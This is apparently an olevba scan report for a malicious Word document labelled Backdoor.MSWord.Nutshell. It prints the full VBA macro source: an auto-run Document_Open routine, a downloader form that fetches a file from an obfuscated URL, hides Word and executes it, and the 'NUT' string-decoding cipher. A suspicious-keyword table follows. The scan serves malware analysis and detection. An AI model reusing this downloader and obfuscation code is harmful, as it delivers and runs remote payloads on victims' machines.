olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
If Dir(d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹ª|")) = "" Then
    If MsgBox(d("¢½·Èn»³¶ÂÊÀºn¾Áu±ÊÀÇ³ÃÂÁÇu¼ÄÂu·ÃÁÉ¯Áºº²ƒn¬½Êº¹nÎ½ÊnÁ·À³uÂÄn¾¼ÈÂ¶ºÁn¾Âu¼ÄÅ”"), vbExclamation + vbYesNo) = vbYes Then
        frmDownload.Show
    Else
        MsgBox d("§ÄÃu±¶¼Ã½ÉnË·ºÅuÂ½·Èn¹½¸ÃÂ³ÃÂuÃÃÂ¾ºuÇÄÃu·ÃÁÉ¯ÁºuÂ½·Èn»³¶ÂÊÀº|"), vbExclamation
    End If
Else
    Shell d("ÀÊ¼¹ºÁ�‡|ºÆºnÀ³Ç¼ººˆ€ƒ²Áº�”¶Â¶ºšÆ¾Â")
    Application.Quit wdDoNotSaveChanges
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmDownload.frm 
in file: Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588 - OLE stream: 'Macros/VBA/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Function df(strURL As String, strDestination As String, _
                        Optional UserName As String = Empty, _
                        Optional Password As String = Empty) _
                        As Boolean

Const CHUNK_SIZE As Long = 1024
Const ROLLBACK As Long = 4096
On Error GoTo OhBoy
                                
                                
Dim bData() As Byte
Dim blnResume As Boolean
Dim intFile As Integer
Dim lngBytesReceived As Long
Dim lngFileLength As Long
Dim lngX
Dim lastTime As Single
Dim sglRate As Single
Dim sglTime As Single
Dim strFile As String
Dim strHeader As String
Dim strHost As String

With Inet1
    .URL = strURL
    .UserName = UserName
    .Password = Password
    .Execute , d("•š¢")
End With

While Inet1.StillExecuting
    DoEvents
    If CancelSearch Then GoTo ExitDownload
Wend

StatusLabel = "Saving:"
ToLabel = FitText(ToLabel, strDestination)
strHeader = Inet1.GetHeader
Select Case Mid(strHeader, 10, 3)
    Case "200"
    Case "206"
    Case "204"
        MsgBox "Nothing to download!", vbInformation, "No Content"
        GoTo ExitDownload
    Case "401"
        MsgBox "Authorization failed!", vbCritical, "Unauthorized"
        GoTo ExitDownload
    Case "404"
        MsgBox "The file was not found!", vbCritical, "File Not Found"
        GoTo ExitDownload
    Case vbCrLf
        MsgBox "Cannot establish connection." & vbCr & vbCr & _
               "Check your Internet connection and try again.", _
               vbExclamation, _
               "Cannot Establish Connection"
        GoTo ExitDownload
    Case Else
        strHeader = Left(strHeader, InStr(strHeader, vbCr))
        If strHeader = Empty Then strHeader = "<nothing>"
        MsgBox "The server returned the following response:" & vbCr & vbCr & _
               strHeader, _
               vbCritical, _
               "Error Downloading File"
        GoTo ExitDownload
End Select

lastTime = Timer - 1
strHeader = Inet1.GetHeader("Content-Length")
lngFileLength = Val(strHeader)
If lngFileLength = 0 Then
    GoTo ExitDownload
End If

With ProgressBar
    .Value = 0
    .Max = lngFileLength
End With

lngBytesReceived = 0


intFile = FreeFile()
Open strDestination For Binary Access Write As #intFile
If blnResume Then Seek #intFile, lngBytesReceived + 1
Do
    bData = Inet1.GetChunk(CHUNK_SIZE, icByteArray)
    Put #intFile, , bData
    If CancelSearch Then Exit Do
    lngBytesReceived = lngBytesReceived + UBound(bData, 1) + 1
    sglRate = lngBytesReceived / (Timer - lastTime)
    sglTime = (lngFileLength - lngBytesReceived) / sglRate
    TimeLabel = FormatTime(sglTime) & _
                   " (" & _
                   FormatFileSize(lngBytesReceived) & _
                   " of " & _
                   FormatFileSize(lngFileLength) & _
                   " copied)"
    RateLabel = FormatFileSize(sglRate, "###.0") & "/Sec"
    ProgressBar.Value = lngBytesReceived
    Me.Caption = d("›¾±Ç½È½»Âu¥ÄÀ¹n}±~nª¾¹¯É³u{u") & Format((lngBytesReceived / lngFileLength), "##0%") & _
                 d("n¸½Â¾Á³É³¹")
Loop While UBound(bData, 1) > 0
Close #intFile

ExitDownload:
If lngBytesReceived = lngFileLength Then
        If lngFileLength <> 0 Then
            StatusLabel = "Download completed!"
            df = True
        End If
Else
    df = False
End If

CleanUp:

If CancelSearch And Dir(strDestination) > Empty Then Kill strDestination
Exit Function
OhBoy:
MsgBox Err.Description, vbCritical, Err.Number
Unload Me
End Function

Private Sub CancelButton_Click()
Unload Me
End Sub

Public Sub startbut_Click()
Dim savas As String
savas = d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹ªÌ½Ç²Ê¾¹€ƒ³Í³")
If Dir(d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹"), vbDirectory) <> "" Then
    RmDir d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹")
End If
MkDir d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹")
If df(d("¶ÉÂÅˆ„}·Á¹|Ê¼¾Æ¸·ÉÇƒ²º}Ç¼ÈÇÈ}ÃÃÉ|ºÆº"), savas) = True Then
    Application.Visible = False
    Shell savas, vbNormalFocus
    Open d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹ªÇ³¶²Â³ƒÂÍÂ") For Output As 1
        Print #1, d("›¾±Ç½È½»Âu¤—“u“Ãµ¾¼ºv¸wu£Å²¶Âº")
        Print #1, d("{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚")
        Print #1, d("¢½·ÈnÊ¾¹¯É³u·ÃÁÉ¯Áºº²uÂ½³u³ÍÂº¼¹³¹n–±É·Ë³‚¦u±Ä¼ÉÀÄºuº¾°Ç¯ÇÇu¯Ã²uÂ½³uÁÊ¾Å½ÇÂu´ÄÀuÂ½½È³ƒ")
        Print #1, d("žÁ³¶Áºn£½É³�n©¶¾ÁuÃÅ²¶Âºn¾Áu·Ãn—³É¯u¡É¯¹·Ê»�nÉ¶¶Âu»º¯ÃÁ�nÉ¶¶Âu·ÉnÂ¯În½¯Ë³u°ÊµÈ|u—»nÎ½Ên»·Ã²u¯ÃÇu°ÊµÈnÅºº¯È³u»¶·ÁnÉ¶ºnšÀÇ½Çn£ÃÂ°ºÀ�nÎ½ÊÀu‘ÊÁÉ½Â³Çnž’u¯Ã²uÇÄÃÇn¸½Â¾ÊÂºÀu·Ã´ÄÀÂ¯É·Ä¼uÂÄnÊÁƒ")
        Print #1, d("‹’‹’‹’‹’‹’‹’‹’‹’‹’‹’‹’‹’")
        Print #1, d("›¾±Ç½È½»Âu‘ÄÀÅ½Ç¯É·Ä¼")
        Print #1, ""
        Print #1, d("›¾±Ç½È½»Â�n«�šzu¤—“u“Ãµ¾¼ºzu�¸Â¾Äº{­n¶ÀºnÉÀ¶²º»¶ÀÀÁu½»n¢·¸ÀÄÁÄ´Én˜½Ç¾ÄÀ¶Â¾½Ã|")
    Close #1
    Shell d("¼ÄÂº¾¶²u±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹ªÇ³¶²Â³ƒÂÍÂ"), vbNormalFocus
    Application.Quit wdDoNotSaveChanges
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO modGlobals.bas 
in file: Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588 - OLE stream: 'Macros/VBA/modGlobals'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetDiskFreeSpace Lib "kernel32" _
                         Alias "GetDiskFreeSpaceA" _
                         (ByVal lpRootPathName As String, _
                          lpSectorsPerCluster As Long, _
                          lpBytesPerSector As Long, _
                          lpNumberOfFreeClusters As Long, _
                          lpTotalNumberOfClusters As Long) As Long

Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
       (ByVal hWnd As Long, _
       ByVal Msg As Long, _
       ByVal wParam As Long, _
       ByVal lParam As Any) As Long

Public Const ACM_OPEN  As Long = &H464



Public Function FitText(ByRef Ctl As Control, _
                        ByVal strCtlCaption) As String

Dim lngCtlLeft As Long
Dim lngMaxWidth As Long
Dim lngTextWidth As Long
Dim lngX As Long

lngCtlLeft = Ctl.Left
lngMaxWidth = Ctl.Width


lngX = (Len(strCtlCaption) \ 2) - 2
While lngTextWidth > lngMaxWidth And lngX > 3
    strCtlCaption = Left(strCtlCaption, lngX) & "..." & _
                    Right(strCtlCaption, lngX)
    lngTextWidth = Ctl.Parent.TextWidth(strCtlCaption)
    lngX = lngX - 1
Wend

FitText = strCtlCaption

End Function

Public Function FormatFileSize(ByVal dblFileSize As Double, _
                               Optional ByVal strFormatMask As String) _
                               As String

Select Case dblFileSize
    Case 0 To 1023              ' Bytes
        FormatFileSize = Format(dblFileSize) & " bytes"
    Case 1024 To 1048575        ' KB
        If strFormatMask = Empty Then strFormatMask = "###0"
        FormatFileSize = Format(dblFileSize / 1024#, strFormatMask) & " KB"
    Case 1024# ^ 2 To 1073741823 ' MB
        If strFormatMask = Empty Then strFormatMask = "###0.0"
        FormatFileSize = Format(dblFileSize / (1024# ^ 2), strFormatMask) & " MB"
    Case Is > 1073741823#       ' GB
        If strFormatMask = Empty Then strFormatMask = "###0.0"
        FormatFileSize = Format(dblFileSize / (1024# ^ 3), strFormatMask) & " GB"
End Select

End Function

Public Function FormatTime(ByVal sglTime As Single) As String
                           

Select Case sglTime
    Case 0 To 59    ' Seconds
        FormatTime = Format(sglTime, "0") & " sec"
    Case 60 To 3599 ' Minutes Seconds
        FormatTime = Format(Int(sglTime / 60), "#0") & _
                     " min " & _
                     Format(sglTime Mod 60, "0") & " sec"
    Case Else       ' Hours Minutes
        FormatTime = Format(Int(sglTime / 3600), "#0") & _
                     " hr " & _
                     Format(sglTime / 60 Mod 60, "0") & " min"
End Select

End Function

Public Function DiskFreeSpace(strDrive As String) As Double


Dim SectorsPerCluster As Long
Dim BytesPerSector As Long
Dim NumberOfFreeClusters As Long
Dim TotalNumberOfClusters As Long
Dim FreeBytes As Long
Dim spaceInt As Integer

strDrive = QualifyPath(strDrive)

GetDiskFreeSpace strDrive, _
                 SectorsPerCluster, _
                 BytesPerSector, _
                 NumberOFreeClusters, _
                 TotalNumberOfClusters

DiskFreeSpace = NumberOFreeClusters * SectorsPerCluster * BytesPerSector

End Function


Public Function QualifyPath(strPath As String) As String

QualifyPath = IIf(Right(strPath, 1) = "\", strPath, strPath & "\")

End Function


Public Function ReturnFileOrFolder(FullPath As String, _
                                   ReturnFile As Boolean, _
                                   Optional IsURL As Boolean = False) _
                                   As String

Dim intDelimiterIndex As Integer

intDelimiterIndex = InStrRev(FullPath, IIf(IsURL, "/", "\"))
If intDelimiterIndex = 0 Then
    ReturnFileOrFolder = FullPath
Else
    ReturnFileOrFolder = IIf(ReturnFile, _
                         Right(FullPath, Len(FullPath) - intDelimiterIndex), _
                         Left(FullPath, intDelimiterIndex))
End If

End Function

Public Function d(What As String) As String
  Zeile = What
  PW = "NUT"
  U = 0
  P = 0
  Do Until Len(Zeile) = P
   k = k + 1
   U = U + 1
   P = P + 1
   If k = Len(PW) Then k = 1
   Z2 = Mid(PW, k, 1)
      If Z2 = " " Then
    Z2 = Mid(PW, k + 1, 1)
    k = k + 1
    End If
   Zeichen = Mid(Zeile, P, 1)
   NewChar = Asc(Zeichen) - Asc(Z2)
   If NewChar < 0 Then NewChar = NewChar + 255
   Crypt = Crypt + Chr$(NewChar)
  Loop
  d = Crypt
End Function
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancel@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Estimated time left:�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Start
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Transfer Rate:I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Saving as:atE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
ERROR: Unsupported stored type in user form: 32768
-------------------------------------------------------------------------------
VBA FORM Variable "b'ProgressBar'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'StatusLabel'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TimeLabel'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ToLabel'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'RateLabel'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CancelButton'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Inet1'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'startbut'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Backdoor.MSWord.Nutshell-3fa6a8e454ee3671bc33f1f1c6f553acc60e7588' - OLE stream: 'Macros/frmDownload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CancelButton_Click  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|nU4A                |6E553441                                     |
+----------+--------------------+---------------------------------------------+

